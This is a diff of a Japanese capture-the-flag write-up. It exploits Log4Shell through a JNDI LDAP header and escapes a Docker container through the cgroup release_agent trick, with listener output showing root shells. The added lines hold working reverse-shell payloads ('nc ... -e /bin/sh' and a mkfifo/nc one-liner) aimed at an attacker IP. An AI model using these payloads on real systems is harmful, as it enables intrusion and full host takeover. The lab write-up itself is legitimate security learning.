@@ -81,17 +81,6 @@ MAC Address: 16:FF:DB:18:76:EF (Unknown)
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```
 
-### サブドメイン、VHOST
-
-2万、11万のリストもある。
-```shell
-ffuf -u http://example.thm -c -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -H 'Host: FUZZ.example.thm' -fs 0
-```
-
-```sh
-gobuster vhost -u http://example.com -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain -t 64 -k
-```
-
 ### ディレクトリ列挙
 
 ~logsディレクトリ発見
@@ -194,41 +183,102 @@ connect to [10.11.146.32] from (UNKNOWN) [10.201.93.140] 46080
  `�^C
 ```
 
+エクスプロイト
+
 ```sh
-wget https://github.com/feihong-cs/JNDIExploit/releases/download/v1.2/JNDIExploit.v1.2.zip
-unzip JNDIExploit.v1.2.zip
-java -jar JNDIExploit-1.2-SNAPSHOT.jar -i 10.11.146.32 -p 8888
+git clone https://github.com/pimps/JNDI-Exploit-Kit
+cd JNDI-Exploit-Kit
+java -jar JNDI-Exploit-Kit.jar -C "nc 10.11.146.32 8888 -e /bin/sh" -A "10.11.146.32"
 ```
 
 ```sh
-curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://10.11.146.32:1389/Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo=}'
+$ curl http://lumberjack.thm -H 'Accept: ${jndi:ldap://10.11.146.32:1389/5wvdvn}'
 ```
 
-## 権限昇格
+リバースシェル取得成功
+
+```sh
+$ nc -lnvp 8888   
+listening on [any] 8888 ...
+connect to [10.11.146.32] from (UNKNOWN) [10.201.48.107] 42577
+id
+uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
+```
+
+flag1発見。
+
+```sh
+./opt:
+total 12
+drwxr-xr-x    1 root     root          4096 Dec 11  2021 .
+drwxr-xr-x    1 root     root          4096 Dec 13  2021 ..
+-rw-r--r--    1 root     root            19 Dec 11  2021 .flag1
+```
+
+## Dockerエスケープ
+
+cgroup は v1
+
+```sh
+mount | grep cgroup
+tmpfs on /sys/fs/cgroup type tmpfs (rw,nosuid,nodev,noexec,relatime,mode=755,inode64)
+cgroup on /sys/fs/cgroup/systemd type cgroup (rw,nosuid,nodev,noexec,relatime,xattr,name=systemd)
+cgroup on /sys/fs/cgroup/misc type cgroup (rw,nosuid,nodev,noexec,relatime,misc)
+cgroup on /sys/fs/cgroup/memory type cgroup (rw,nosuid,nodev,noexec,relatime,memory)
+cgroup on /sys/fs/cgroup/hugetlb type cgroup (rw,nosuid,nodev,noexec,relatime,hugetlb)
+cgroup on /sys/fs/cgroup/net_cls,net_prio type cgroup (rw,nosuid,nodev,noexec,relatime,net_cls,net_prio)
+cgroup on /sys/fs/cgroup/pids type cgroup (rw,nosuid,nodev,noexec,relatime,pids)
+cgroup on /sys/fs/cgroup/perf_event type cgroup (rw,nosuid,nodev,noexec,relatime,perf_event)
+cgroup on /sys/fs/cgroup/cpuset type cgroup (rw,nosuid,nodev,noexec,relatime,cpuset)
+cgroup on /sys/fs/cgroup/cpu,cpuacct type cgroup (rw,nosuid,nodev,noexec,relatime,cpu,cpuacct)
+cgroup on /sys/fs/cgroup/blkio type cgroup (rw,nosuid,nodev,noexec,relatime,blkio)
+cgroup on /sys/fs/cgroup/rdma type cgroup (rw,nosuid,nodev,noexec,relatime,rdma)
+cgroup on /sys/fs/cgroup/freezer type cgroup (rw,nosuid,nodev,noexec,relatime,freezer)
+cgroup on /sys/fs/cgroup/devices type cgroup (rw,nosuid,nodev,noexec,relatime,devices)
+```
+
+エクスプロイト
+
+```sh
+mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
+echo 1 > /tmp/cgrp/x/notify_on_release
+host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
+echo "$host_path/exploit" > /tmp/cgrp/release_agent
+echo '#!/bin/sh' > /exploit
+echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.11.146.32 7777 >/tmp/f" >> /exploit
+chmod a+x /exploit
+sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
+```
+
+ホストシェル取得成功
+
+```sh
+$ nc -lnvp 7777             
+listening on [any] 7777 ...
+connect to [10.11.146.32] from (UNKNOWN) [10.201.48.107] 50010
+/bin/sh: 0: can't access tty; job control turned off
+# id
+uid=0(root) gid=0(root) groups=0(root)
+# ls -al /root
+total 36
+drwx------  5 root root 4096 Jun  5 18:16 .
+drwxr-xr-x 22 root root 4096 Sep 16 06:37 ..
+drwxr-xr-x  2 root root 4096 Dec 13  2021 ...
+-rw-r--r--  1 root root 3106 Apr  9  2018 .bashrc
+drwx------  2 root root 4096 May 24 14:35 .cache
+-rw-r--r--  1 root root  161 Jan  2  2024 .profile
+drwx------  2 root root 4096 Dec 13  2021 .ssh
+-rw-------  1 root root  966 Jun  5 18:16 .viminfo
+-r--------  1 root root   29 Dec 13  2021 root.txt
+```
+
+flag2発見
+
+```sh
+# find / -iname *flag2*; echo hello
+/root/.../._fLaG2
+```
 
 ## 振り返り
 
--
--
-
-## シェル安定化メモ
-
-```shell
-# python が無くても、python3 でいける場合もある
-python3 -c 'import pty; pty.spawn("/bin/bash")'
-export TERM=xterm
-
-# Ctrl+Z でバックグラウンドにした後に
-stty raw -echo; fg
-
-#（終了後）エコー無効にして入力非表示になっているので
-reset
-
-# まず、他のターミナルを開いて rows, columns の値を調べる
-stty -a
-
-# リバースシェルで rows, cols を設定する
-stty rows 52
-stty cols 236
-
-```
+- log4shell をCTFで悪用するのはたぶん初めてで、良い経験になった。
